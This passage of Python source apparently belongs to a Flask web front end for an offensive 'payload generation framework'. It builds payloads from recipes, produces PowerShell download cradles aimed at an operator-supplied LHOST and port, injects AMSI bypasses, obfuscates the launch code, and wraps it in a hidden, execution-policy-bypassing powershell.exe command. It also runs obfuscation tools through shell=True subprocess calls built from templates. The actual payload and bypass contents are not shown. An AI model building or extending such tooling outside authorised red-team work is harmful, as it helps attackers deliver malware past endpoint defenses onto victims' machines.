            value = parameters.get(param_name)
            
            # Check if this is a conditional parameter
            required_for = param_def.get('required_for')
            if required_for:
                # This parameter is only required if the specified option is selected
                if required_for not in selected_option_names:
                    # Skip validation for this parameter since its option is not selected
                    continue
            
            # Validate this parameter
            validator.validate_parameter(param_def, value)
            
            # Store validated value (convert types as needed)
            if value is not None and value != '':
                param_type = param_def.get('type', 'string')
                if param_type == 'integer':
                    validated_params[param_name] = int(value)
                elif param_type == 'port':
                    validated_params[param_name] = int(value)
                elif param_type == 'bool':
                    validated_params[param_name] = value if isinstance(value, bool) else value == 'true'
                else:
                    validated_params[param_name] = value
            elif param_def.get('default') is not None:
                # Use default value if no value provided
                validated_params[param_name] = param_def.get('default')
                
    except ValidationError as e:
        return jsonify({'error': f'Validation error: {e}'}), 400
    
    # Create build session
    session_id = str(uuid.uuid4())
    build_sessions[session_id] = {
        'status': 'pending',
        'steps': [{
            'name': 'Initializing build',
            'type': 'initialize',
            'status': 'running',
            'output': 'Preparing build environment...',
            'error': None
        }],
        'output_file': None,
        'launch_instructions': None,
        'error': None
    }
    build_locks[session_id] = threading.Lock()
    
    # Start build in background thread
    def build_thread():
        try:
            # Create a temporary config with build options
            from copy import deepcopy
            temp_config = deepcopy(config)
            
            # Override build options if provided
            if 'remove_comments' in build_options:
                temp_config.config['remove_comments'] = build_options['remove_comments']
            if 'remove_console_output' in build_options:
                temp_config.config['remove_console_output'] = build_options['remove_console_output']
            if 'strip_binaries' in build_options:
                temp_config.config['strip_binaries'] = build_options['strip_binaries']
            
            # Pass build_options to PayloadBuilder
            builder = PayloadBuilder(temp_config, build_options=build_options)
            
            # Progress callback
            def on_progress(step: BuildStep):
                with build_locks[session_id]:
                    # Convert bytes to string for JSON serialization
                    output = step.output
                    if isinstance(output, bytes):
                        try:
                            output = output.decode('utf-8', errors='replace')
                        except:
                            output = str(output)
                    
                    error = step.error
                    if isinstance(error, bytes):
                        try:
                            error = error.decode('utf-8', errors='replace')
                        except:
                            error = str(error)
                    
                    build_sessions[session_id]['steps'].append({
                        'name': step.name,
                        'type': step.type,
                        'status': step.status,
                        'output': str(output) if output else '',
                        'error': str(error) if error else ''
                    })
            
            builder.set_progress_callback(on_progress)
            
            # Resolve preprocessing options in recipe
            recipe_dict = recipe_obj.to_dict()
            if preprocessing_selections:
                resolved_preprocessing = []
                for step in recipe_dict.get('preprocessing', []):
                    if step.get('type') == 'option':
                        # This is an option step - resolve to the selected option
                        option_name = step.get('name')
                        selected_index = preprocessing_selections.get(option_name, 0)
                        options = step.get('options', [])
                        
                        if 0 <= selected_index < len(options):
                            # Replace with the selected option
                            selected_option = options[selected_index]
                            resolved_preprocessing.append(selected_option)
                    else:
                        # Regular preprocessing step - keep as is
                        resolved_preprocessing.append(step)
                
                recipe_dict['preprocessing'] = resolved_preprocessing
            
            # Build payload
            success, output_file, steps = builder.build(recipe_dict, validated_params)
            
            with build_locks[session_id]:
                if success:
                    build_sessions[session_id]['status'] = 'success'
                    build_sessions[session_id]['output_file'] = output_file
                    
                    # Process launch instructions
                    final_launch_instructions = recipe_obj.launch_instructions
                    
                    # Step 0: Generate cradle if requested (FIRST)
                    cradle_code = ''
                    if build_options.get('ps_cradle') or build_options.get('cs_cradle'):
                        cradle_method = build_options.get('ps_cradle_method') or build_options.get('cs_cradle_method', '')
                        cradle_obf_method = build_options.get('ps_cradle_obf_method') or build_options.get('cs_cradle_obf_method', '')
                        lhost = build_options.get('cradle_lhost', '')
                        lport = build_options.get('cradle_lport', 80)
                        
                        if cradle_method and lhost:
                            # Get output filename from the build
                            import os
                            output_filename = os.path.basename(output_file)
                            
                            # Generate cradle
                            cradle_step_name = f'Generating download cradle ({cradle_method})'
                            if cradle_obf_method:
                                cradle_step_name += f' with obfuscation ({cradle_obf_method})'
                            
                            cradle_step = {
                                'name': cradle_step_name,
                                'type': 'cradle',
                                'status': 'running',
                                'output': f"Generating cradle for {output_filename}",
                                'error': ''
                            }
                            build_sessions[session_id]['steps'].append(cradle_step)
                            
                            cradle_code, command_used = generate_cradle(
                                cradle_method,
                                lhost,
                                lport,
                                output_filename,
                                cradle_obf_method
                            )
                            
                            if cradle_code:
                                cradle_step['status'] = 'success'
                                cradle_output = f"Cradle generated successfully"
                                if command_used:
                                    cradle_output += f"\n\nCommand: {command_used}"
                                cradle_step['output'] = cradle_output
                            else:
                                cradle_step['status'] = 'failed'
                                cradle_step['error'] = 'Failed to generate cradle'
                    
                    # Step 1: Insert AMSI bypass if requested (BEFORE obfuscation)
                    if (build_options.get('amsi_bypass_launch', False) and 
                        recipe_obj.launch_instructions):
                        amsi_method = build_options.get('amsi_bypass_launch_method', '')
                        amsi_obf_method = build_options.get('amsi_bypass_launch_obf_method', '')
                        
                        if amsi_method:
                            # Add AMSI bypass step
                            amsi_step_name = f'Inserting AMSI bypass in launch instructions ({amsi_method})'
                            if amsi_obf_method:
                                amsi_step_name += f' with obfuscation ({amsi_obf_method})'
                            
                            amsi_step = {
                                'name': amsi_step_name,
                                'type': 'amsi_bypass',
                                'status': 'success',
                                'output': f"AMSI bypass '{amsi_method}' injected into launch instructions",
                                'error': ''
                            }
                            build_sessions[session_id]['steps'].append(amsi_step)
                            
                            # Inject bypass
                            final_launch_instructions = inject_amsi_bypass_launch_instructions(
                                final_launch_instructions,
                                amsi_method,
                                amsi_obf_method
                            )
                    
                    # Step 2: Obfuscate PowerShell if requested
                    if (build_options.get('obfuscate_launch_ps', False) and 
                        final_launch_instructions):
                        obf_method = build_options.get('obfuscate_launch_ps_level', '')
                        
                        # Add obfuscation step to build session
                        obf_step = {
                            'name': f'Obfuscating launch instructions ({obf_method})',
                            'type': 'obfuscation',
                            'status': 'running',
                            'output': f'Obfuscating PowerShell code blocks in launch instructions',
                            'error': ''
                        }
                        build_sessions[session_id]['steps'].append(obf_step)
                        
                        # Perform obfuscation
                        final_launch_instructions, commands = obfuscate_powershell_in_launch_instructions(
                            final_launch_instructions, 
                            obf_method
                        )
                        
                        # Update step status with commands
                        commands_output = '\n\n'.join([f'Command: {cmd}' for cmd in commands]) if commands else 'No PowerShell code blocks found'
                        obf_step['status'] = 'success'
                        obf_step['output'] = f'{commands_output}\n\nSuccessfully obfuscated PowerShell code blocks ({obf_method})'
                    
                    # Step 3: Prepend cradle to launch instructions if generated
                    if cradle_code:
                        cradle_section = f"# Cradle\n\n```powershell\n{cradle_code}\n```\n\n"
                        if final_launch_instructions:
                            final_launch_instructions = cradle_section + final_launch_instructions
                        else:
                            final_launch_instructions = cradle_section
                    
                    build_sessions[session_id]['launch_instructions'] = final_launch_instructions
                    
                    # Prepare build steps for history (include obfuscation step if present)
                    history_steps = [{
                        'name': s.name,
                        'type': s.type,
                        'status': s.status,
                        'output': str(s.output) if s.output else '',
                        'error': str(s.error) if s.error else ''
                    } for s in steps]
                    
                    # Add AMSI bypass step for launch instructions if performed
                    if build_options.get('amsi_bypass_launch', False) and recipe_obj.launch_instructions:
                        for step in build_sessions[session_id]['steps']:
                            if 'AMSI bypass in launch instructions' in step['name']:
                                history_steps.append(step)
                                break
                    
                    # Add launch instructions obfuscation step to history if it was performed
                    if build_options.get('obfuscate_launch_ps', False) and final_launch_instructions:
                        # Find the obfuscation step in build_sessions
                        for step in build_sessions[session_id]['steps']:
                            if 'Obfuscating launch instructions' in step['name']:
                                history_steps.append(step)
                                break
                    
                    # Add to history
                    if history_manager:
                        history_manager.add_entry(
                            recipe_name=recipe_obj.name,
                            success=True,
                            output_file=output_file,
                            parameters=validated_params,
                            launch_instructions=final_launch_instructions or "",
                            build_steps=history_steps
                        )
                else:
                    build_sessions[session_id]['status'] = 'failed'
                    error_steps = [s for s in steps if s.status == 'failed']
                    if error_steps:
                        build_sessions[session_id]['error'] = error_steps[0].error
                    
                    # Add failed build to history
                    if history_manager:
                        history_manager.add_entry(
                            recipe_name=recipe_obj.name,
                            success=False,
                            output_file=output_file or "Build failed",
                            parameters=validated_params,
                            launch_instructions="",
                            build_steps=[{
                                'name': s.name,
                                'type': s.type,
                                'status': s.status,
                                'output': str(s.output) if s.output else '',
                                'error': str(s.error) if s.error else ''
                            } for s in steps]
                        )
        
        except Exception as e:
            with build_locks[session_id]:
                build_sessions[session_id]['status'] = 'failed'
                build_sessions[session_id]['error'] = str(e)
    
    thread = threading.Thread(target=build_thread)
    thread.daemon = True
    thread.start()
    
    return jsonify({'session_id': session_id})


@app.route('/api/build-status/<session_id>')
def get_build_status(session_id):
    """Get the status of a build session"""
    if session_id not in build_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    with build_locks.get(session_id, threading.Lock()):
        session = build_sessions[session_id].copy()
    
    return jsonify(session)


@app.route('/api/history')
def get_history():
    """Get build history"""
    if not history_manager:
        return jsonify({'entries': [], 'stats': {'total': 0, 'success': 0, 'failed': 0}})
    
    entries = history_manager.get_entries()
    
    # Convert to JSON-serializable format
    history_data = []
    for entry in entries:
        history_data.append({
            'recipe_name': entry.recipe_name,
            'timestamp': entry.timestamp,
            'formatted_timestamp': entry.formatted_timestamp,
            'success': entry.success,
            'output_file': entry.output_file,
            'output_filename': os.path.basename(entry.output_file),
            'parameters': entry.parameters,
            'launch_instructions': entry.launch_instructions,
            'build_steps': entry.build_steps or []
        })
    
    stats = {
        'total': history_manager.get_entry_count(),
        'success': history_manager.get_success_count(),
        'failed': history_manager.get_failure_count()
    }
    
    return jsonify({'entries': history_data, 'stats': stats})


@app.route('/api/history/clear', methods=['POST'])
def clear_history():
    """Clear build history"""
    if history_manager:
        history_manager.clear_all()
        return jsonify({'success': True})
    return jsonify({'error': 'History manager not available'}), 500


@app.route('/api/history/<int:index>', methods=['DELETE'])
def delete_history_entry(index):
    """Delete a single history entry"""
    if history_manager:
        if history_manager.delete_entry(index):
            return jsonify({'success': True})
        return jsonify({'error': 'Invalid index'}), 400
    return jsonify({'error': 'History manager not available'}), 500


def _apply_powershell_wrapper(ps_command):
    """
    Apply PowerShell CMD launcher wrapper with proper escaping for cmd.exe
    
    Args:
        ps_command: The PowerShell command to wrap
        
    Returns:
        Wrapped command ready for execution from cmd.exe
    """
    # Escape quotes for cmd.exe context
    # In cmd.exe, we need to escape double quotes with backslash when inside a quoted string
    # and also escape any existing backslashes that precede quotes
    
    # First, escape existing backslashes that are followed by quotes
    escaped = ps_command.replace('\\', '\\\\')
    
    # Then escape double quotes
    escaped = escaped.replace('"', '\\"')
    
    # Single quotes don't need escaping in PowerShell strings when wrapped in double quotes
    # But we need to handle them if they're part of PowerShell string literals
    
    # Build the wrapper command
    wrapper = f'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "{escaped}"'
    
    return wrapper


@app.route('/api/obfuscate-ps', methods=['POST'])
def obfuscate_powershell():
    """Obfuscate PowerShell command using YAML-based methods
    
    Request JSON:
        command: PowerShell command to obfuscate
        method: Obfuscation method name from ps-obfuscation.yaml
        add_wrapper: Whether to add PowerShell CMD launcher wrapper
        
    Returns:
        JSON with obfuscated PowerShell code
    """
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        ps_command = data.get('command', '').strip()
        method_name = data.get('method', '').strip()
        add_wrapper = data.get('add_wrapper', False)
        
        if not ps_command:
            return jsonify({'error': 'PowerShell command is required'}), 400
        
        # Handle None/empty method - return command as-is (with optional wrapper)
        if not method_name:
            result_code = ps_command
            if add_wrapper:
                result_code = _apply_powershell_wrapper(result_code)
            return jsonify({
                'success': True,
                'obfuscated': result_code,
                'method': 'None',
                'command': ''
            })
        
        # Find the obfuscation method
        obf_method = None
        for method in ps_obfuscation_methods:
            if method.get('name') == method_name:
                obf_method = method
                break
        
        if not obf_method:
            return jsonify({'error': f'Obfuscation method "{method_name}" not found'}), 400
        
        # Create temporary files for obfuscation
        with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False) as tmp_in:
            tmp_in.write(ps_command)
            tmp_in_path = tmp_in.name
        
        tmp_out_path = tmp_in_path.replace('.ps1', '_obf.ps1')
        
        try:
            # Generate random values for template variables
            rand_hex_bytes = random.randint(8, 32)
            rand_hex_length = rand_hex_bytes * 2
            rand_hex = ''.join(random.choices('0123456789abcdef', k=rand_hex_length))
            rand_stringdict = random.randint(0, 100)
            rand_deadcode = random.randint(0, 100)
            rand_seed = random.randint(0, 10000)
            
            # Build command from template
            command_template = obf_method.get('command', '')
            command = command_template.replace('{temp}', tmp_in_path)
            command = command.replace('{out}', tmp_out_path)
            command = command.replace('{hex_key}', rand_hex)
            command = command.replace('{string_dict}', str(rand_stringdict))
            command = command.replace('{dead_code}', str(rand_deadcode))
            command = command.replace('{seed}', str(rand_seed))
            
            # Execute obfuscation
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=120
            )
            
            # Check if successful
            if result.returncode == 0 and os.path.exists(tmp_out_path):
                with open(tmp_out_path, 'r') as f:
                    obfuscated_code = f.read().strip()
                
                # Apply wrapper if requested
                if add_wrapper:
                    obfuscated_code = _apply_powershell_wrapper(obfuscated_code)
                
                # Clean up temp files
                try:
                    os.unlink(tmp_in_path)
                    os.unlink(tmp_out_path)
                except:
                    pass
                
                return jsonify({
                    'success': True,
                    'obfuscated': obfuscated_code,
                    'method': method_name,
                    'command': command
                })
            else:
                # Obfuscation failed
                error_msg = result.stderr if result.stderr else 'Unknown error'
                try:
                    os.unlink(tmp_in_path)
                    if os.path.exists(tmp_out_path):
                        os.unlink(tmp_out_path)
                except:
                    pass
                
                return jsonify({'error': f'Obfuscation failed: {error_msg}'}), 500
                
        except subprocess.TimeoutExpired:
            # Clean up temp files on timeout
            try:
                os.unlink(tmp_in_path)
                if os.path.exists(tmp_out_path):
                    os.unlink(tmp_out_path)
            except:
                pass
            
            return jsonify({'error': 'Obfuscation timed out. Try a simpler command.'}), 500
            
        except Exception as e:
            # Clean up temp files on error
            try:
                os.unlink(tmp_in_path)
                if os.path.exists(tmp_out_path):
                    os.unlink(tmp_out_path)
            except:
                pass
            
            return jsonify({'error': f'Obfuscation failed: {str(e)}'}), 500
            
    except Exception as e:
        return jsonify({'error': f'Request processing failed: {str(e)}'}), 500


def run_web_app(host=None, port=None, debug=None):
    """Run the Flask web application
    
    Args:
        host: Host to bind to (defaults to config value)
        port: Port to bind to (defaults to config value)
        debug: Debug mode (defaults to config value)
    """
    init_app()
    
    host = host or config.web_host
    port = port or config.web_port
    debug = debug if debug is not None else config.web_debug
    
    print(f"\n{'='*60}")
    print(f"PAYGEN WEB - Payload Generation Framework")
    print(f"{'='*60}")
    print(f"Server running at: http://{host}:{port}")
    print(f"Recipes loaded: {len(recipes)}")
    print(f"Categories: {len(set(r.category for r in recipes))}")
    print(f"{'='*60}\n")
    
    app.run(host=host, port=port, debug=debug)
